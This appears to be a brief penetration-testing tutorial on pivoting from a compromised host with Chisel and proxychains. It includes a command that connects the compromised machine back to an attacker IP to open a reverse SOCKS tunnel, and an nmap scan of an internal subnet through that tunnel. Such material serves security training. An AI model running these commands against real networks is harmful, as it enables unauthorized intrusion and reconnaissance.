Process Flow

Establishing and Using the Pivot

1

Transfer Chisel client to compromised host.

2

Run Chisel client to connect to attacker's server, establishing reverse SOCKS.

3

On attacker, use proxychains to route tools through the established SOCKS proxy.

4

Observe results from the internal network, confirming successful pivoting.

Step 3: Run Chisel Client

On Compromised Machine

./chisel client <ATTACKER_IP>:8000 R:socks

Connects the client to your attacking machine, establishing the reverse SOCKS proxy.

Step 4: Scan Internal Network

Back on Attacking Machine

proxychains nmap -sT 10.10.10.0/24

Uses proxychains to route nmap traffic through the Chisel SOCKS proxy to the internal network.

Key Takeaway

Successfully connecting the Chisel client and using proxychains demonstrates effective SOCKS proxy pivoting for internal network reconnaissance.
